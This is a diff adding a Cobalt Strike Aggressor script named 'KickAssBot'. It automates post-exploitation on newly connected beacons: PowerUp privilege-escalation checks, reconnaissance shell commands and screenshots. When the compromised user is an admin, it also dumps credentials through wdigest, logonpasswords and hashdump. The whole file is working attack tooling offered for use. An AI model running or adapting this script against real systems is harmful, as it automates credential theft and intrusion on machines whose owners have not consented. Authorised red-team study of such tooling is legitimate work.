@@ -1,0 +1,36 @@
+##This is KickAssBot [https://github.com/kussic/CS-KickassBot]
+$KABver = "1.1";
+
+on beacon_initial {
+	say("A new beacon popped up, I'm sending the initial commands...");
+  bpowershell_import($1, script_resource("scripts/PowerUp1.ps1"));
+	bpowershell($1, "Invoke-AllChecks");
+	bshell($1,"ipconfig & whoami & date /t & time /t")
+
+	bscreenshot($1,0);
+	openScreenshotBrowser();
+
+	bnote("$1", mynick() . " - Init Completed \[" . formatDate("yyyy.MM.dd HH:mm:ss z") . "\]");
+
+	if (" *" isin beacon_info($1, "user")) {
+		blog("This user is an admin!");
+		bwdigest($1);
+		blogonpasswords($1);
+		bhashdump($1);
+	}
+}
+
+on beacon_output {
+	println("[" . binfo("$1","user") . "@" . binfo("$1","computer") . "] ". $2);
+}
+
+on ready {
+	say(mynick() . "@" . localip() . " \[KABot version: $KABver\] reporting for duty!");
+}
+
+on profiler_hit {
+	say("New Profiler hit from $1 \($3\)");
+	println("Profiler hit: " . subarray(@_,0));
+
+
+}
